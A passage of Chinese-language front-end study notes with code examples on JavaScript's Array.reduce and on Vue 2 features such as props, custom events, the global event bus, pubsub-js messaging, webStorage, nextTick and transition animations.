10</p><p>这里可以看出，上面的例子index是从1开始的，第一次prev的值是数组的第一个值，数组的长度是4，但是reduce函数循环3次。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function">(<span class="params">pre, cur, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(pre, cur, index);</span><br><span class="line">    <span class="keyword">return</span> pre + cur;</span><br><span class="line">&#125;, <span class="number">0</span>)<span class="comment">//指定cur的类型为Number并且初始值为0</span></span><br><span class="line"><span class="built_in">console</span>.log(arr, sum);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>例二打印结果：</strong><br> 0 1 0<br> 1 2 1<br> 3 3 2<br> 6 4 3<br> [1, 2, 3, 4] 10</p><p>这个例子index是从0开始的，第一次的perv的值是我们设置的初始值0，数组长度是4，reduce函数循环4次。</p><p>如果没有提供initialValue，reduce 会从索引1的地方开始执行 callback 方法，跳过第一个索引。<br>如果提供initialValue，从索引0开始。<br>例三</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = []; <span class="comment">// 空数组</span></span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function">(<span class="params">pre, cur, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(pre, cur, index);</span><br><span class="line">    <span class="keyword">return</span> pre + cur;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(arr, sum);</span><br></pre></td></tr></table></figure><p>例三打印结果：<br>报错：TypeError: Reduce of empty array with no initial value</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = []; <span class="comment">// 空数组</span></span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function">(<span class="params">pre, cur, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(pre, cur, index);</span><br><span class="line">    <span class="keyword">return</span> pre + cur;</span><br><span class="line">&#125;, <span class="number">0</span>) <span class="comment">// 提供初始值</span></span><br><span class="line"><span class="built_in">console</span>.log(arr, sum);</span><br></pre></td></tr></table></figure><p>打印结果：<br>[ ] 0</p><p><strong>通常提供初始值更安全</strong></p><h4 id="求和求积"><a href="#求和求积" class="headerlink" title="求和求积"></a>求和求积</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x + y;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> mul = arr.reduce(<span class="function">(<span class="params">x, y</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> x * y;</span><br><span class="line">&#125;, <span class="number">1</span>);</span><br><span class="line">sonsole.log(sum); <span class="comment">// 求和 10</span></span><br><span class="line">sonsole.log(mul); <span class="comment">// 求积 24</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="计算数组中每个元素出现的次数"><a href="#计算数组中每个元素出现的次数" class="headerlink" title="计算数组中每个元素出现的次数"></a>计算数组中每个元素出现的次数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> names = [<span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;Tiff&#x27;</span>, <span class="string">&#x27;Alice&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> nameNum = names.reduce(<span class="function">(<span class="params">pre, cur</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (cur <span class="keyword">in</span> pre) &#123;</span><br><span class="line">pre[cur]++</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">pre[cur] = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> pre</span><br><span class="line">&#125;, &#123;&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(nameNum )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>{ Alice: 2, Bob: 1, Tiff: 1 }</p><h3 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>]</span><br><span class="line"><span class="keyword">var</span> newArr = arr.reduce(<span class="function">(<span class="params">pre, cur</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!pre.includes(cur)) &#123;</span><br><span class="line"><span class="keyword">return</span> pre.concat(cur)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> pre</span><br><span class="line">&#125;</span><br><span class="line">&#125;, [])</span><br><span class="line"><span class="built_in">console</span>.log(newArr)</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure><ol><li><p>组件化编码流程：</p><p>​    (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。</p><p>​    (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：</p><p>​            1).一个组件在用：放在组件自身即可。</p><p>​            2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。</p><p>​    (3).实现交互：从绑定事件开始。</p></li><li><p>props适用于：</p><p>​    (1).父组件 ==&gt; 子组件 通信</p><p>​    (2).子组件 ==&gt; 父组件 通信（要求父先给子一个函数）</p></li><li><p><strong>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</strong></p></li><li><p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p></li></ol><h3 id="vue中的-event"><a href="#vue中的-event" class="headerlink" title="vue中的$event"></a>vue中的$event</h3><p>通常的用法是用来获取当前元素的最新值。<code>$event.target.value</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;abc($event)&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">   <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">     <span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       <span class="attr">data</span>: &#123;&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       <span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">         <span class="function"><span class="title">abc</span>(<span class="params">event</span>)</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">           <span class="built_in">console</span>.log(event.target.value);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">         &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">       &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">     &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="xml">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="webStorage"><a href="#webStorage" class="headerlink" title="webStorage"></a>webStorage</h2><ol><li><p>存储内容大小一般支持5MB左右（不同浏览器可能还不一样）</p></li><li><p>浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。</p></li><li><p>相关API：</p><ol><li><p><code>xxxxxStorage.setItem(&#39;key&#39;, &#39;value&#39;);</code></p><pre><code>该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。</code></pre></li><li><p><code>xxxxxStorage.getItem(&#39;person&#39;);</code></p><p>​        该方法接受一个键名作为参数，返回键名对应的值。</p></li><li><p><code>xxxxxStorage.removeItem(&#39;key&#39;);</code></p><p>​        该方法接受一个键名作为参数，并把该键名从存储中删除。</p></li><li><p><code> xxxxxStorage.clear()</code></p><p>​        该方法会清空存储中的所有数据。</p></li></ol></li><li><p>备注：</p><ol><li>SessionStorage存储的内容会随着浏览器窗口关闭而消失。</li><li>LocalStorage存储的内容，需要手动清除才会消失。</li><li><code>xxxxxStorage.getItem(xxx)</code>如果xxx对应的value获取不到，那么getItem的返回值是null。</li><li><code>JSON.parse(null)</code>的结果依然是null。</li></ol></li></ol><p>一般采用JSON.stringify()和JSON.parse()转化js对象和字符串</p><p>JSON.stringify() 方法用于将 JavaScript 值转换为 JSON 字符串</p><h2 id="组件的自定义事件"><a href="#组件的自定义事件" class="headerlink" title="组件的自定义事件"></a>组件的自定义事件</h2><ol><li><p>一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===&gt; 父组件</strong></p></li><li><p>使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。</p></li><li><p>绑定自定义事件：</p><ol><li><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>  或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;</code></p></li><li><p>第二种方式，在父组件中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Demo ref=<span class="string">&quot;demo&quot;</span>/&gt;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.$refs.xxx.$on(<span class="string">&#x27;atguigu&#x27;</span>,<span class="built_in">this</span>.test)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p></li></ol></li><li><p>触发自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code>        </p></li><li><p>解绑自定义事件<code>this.$off(&#39;atguigu&#39;)</code></p></li><li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符，<code>@click.native=&quot;xxx&quot;</code>,交给组件实例最外侧的dom</p></li><li><p>注意：通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p></li></ol><h2 id="全局事件总线（GlobalEventBus）"><a href="#全局事件总线（GlobalEventBus）" class="headerlink" title="全局事件总线（GlobalEventBus）"></a>全局事件总线（GlobalEventBus）</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>安装全局事件总线：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">Vue.prototype.$bus = <span class="built_in">this</span> <span class="comment">//安装全局事件总线，$bus就是当前应用的vm</span></span><br><span class="line">&#125;,</span><br><span class="line">    ......</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure></li><li><p>使用事件总线：</p><ol><li><p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">methods</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="title">demo</span>(<span class="params">data</span>)</span>&#123;......&#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$bus.$on(<span class="string">&#x27;xxxx&#x27;</span>,<span class="built_in">this</span>.demo)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>提供数据：<code>this.$bus.$emit(&#39;xxxx&#39;,数据)</code></p></li></ol></li><li><p>最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。</p></li></ol><h2 id="消息订阅与发布（pubsub）"><a href="#消息订阅与发布（pubsub）" class="headerlink" title="消息订阅与发布（pubsub）"></a>消息订阅与发布（pubsub）</h2><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>使用步骤：</p><ol><li><p>安装pubsub：<code>npm i pubsub-js</code></p></li><li><p>引入: <code>import pubsub from &#39;pubsub-js&#39;</code></p></li><li><p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">methods</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="title">demo</span>(<span class="params">data</span>)</span>&#123;......&#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.pid = pubsub.subscribe(<span class="string">&#x27;xxx&#x27;</span>,<span class="built_in">this</span>.demo) <span class="comment">//订阅消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>提供数据：<code>pubsub.publish(&#39;xxx&#39;,数据)</code></p></li><li><p>最好在beforeDestroy钩子中，用<code>PubSub.unsubscribe(this.pid)</code>去<span style="color:red">取消订阅。</span></p></li></ol></li></ol><p><strong>订阅消息</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pubsub <span class="keyword">from</span> <span class="string">&#x27;pubsub-js&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>&#123;</span><br><span class="line">     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>:&#123;</span><br><span class="line">        <span class="function"><span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;school组件发布的消息成功传输到student组件中了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.pubid = pubsub.subscribe(<span class="string">&#x27;hello&#x27;</span>,<span class="built_in">this</span>.hello)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        pubsub.unsubscribe(<span class="string">&#x27;pubid&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>发布消息</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;school&quot;</span>&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;schoolName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendShoolName&quot;</span>&gt;</span>将学校名传给兄弟组件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pubsub <span class="keyword">from</span> <span class="string">&#x27;pubsub-js&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">      <span class="attr">schoolName</span>:<span class="string">&#x27;北京大学&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>:&#123;</span><br><span class="line">     <span class="function"><span class="title">sendShoolName</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            pubsub.publish(<span class="string">&#x27;hello&#x27;</span>,<span class="built_in">this</span>.schoolName)</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h2><ol><li>语法：<code>this.$nextTick(回调函数)</code></li><li>作用：在下一次 DOM 更新结束后执行其指定的回调。</li><li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li></ol><h2 id="Vue封装的过度与动画"><a href="#Vue封装的过度与动画" class="headerlink" title="Vue封装的过度与动画"></a>Vue封装的过度与动画</h2><ol><li><p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p></li><li><p>图示：</p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202241442370.png" alt="image-20220224144230098"></p></li><li><p>写法：</p><ol><li><p>准备好样式：</p><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul></li><li><p>使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置name属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;transition name=&quot;hello&quot;&gt;</span><br><span class="line">&lt;h1 v-show=&quot;isShow&quot;&gt;你好啊！&lt;/h1&gt;</span><br><span class="line">&lt;/transition&gt;</span><br></pre></td></tr></table></figure></li><li><p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p></li></ol></li></ol><p>App.vue</p><p>引入animate.css</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">Test3</span>/&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">Test</span>/&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">import</span> Test <span class="keyword">from</span> <span class="string">&#x27;./components/Test.vue&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">import</span> Test3 <span class="keyword">from</span> <span class="string">&#x27;./components/Test3.vue&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">name</span>: <span class="string">&#x27;App&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  <span class="attr">components</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    Test,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    Test3</span></span></span><br><span class="line"><span class="javascript"><span class="xml">  &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>Test3.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;isShow=!isShow&quot;</span>&gt;</span>隐藏<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&#x27;hello&#x27;</span> <span class="attr">appear</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&#x27;isShow&#x27;</span> <span class="attr">class</span>=<span class="string">&#x27;come&#x27;</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="attr">name</span>:<span class="string">&#x27;Test&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="keyword">return</span> &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">isShow</span>:<span class="literal">true</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-tag">h1</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">    <span class="attribute">background-color</span>: orange;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.hello-enter-active</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">    <span class="attribute">animation</span>: zx <span class="number">1s</span>;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="selector-class">.hello-leave-active</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">    <span class="attribute">animation</span>:zx <span class="number">1s</span> reverse;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span></span></span><br><span class="line"><span class="css"><span class="xml"><span class="keyword">@keyframes</span> zx&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">    <span class="selector-tag">from</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">        <span class="attribute">transform</span>: <span class="built_in">translateX</span>(-<span class="number">100%</span>)</span></span></span><br><span class="line"><span class="css"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="css"><span class="xml">    <span class="selector-tag">to</span>&#123;</span></span></span><br><span class="line"><span class="css"><span class="xml">        <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">0px</span>)</span></span></span><br><span class="line"><span class="css"><span class="xml">    &#125;</span></span></span><br><span class="line"><span class="css"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="css"><span class="xml"></span></span></span><br><span class="line"><span class="css"><span 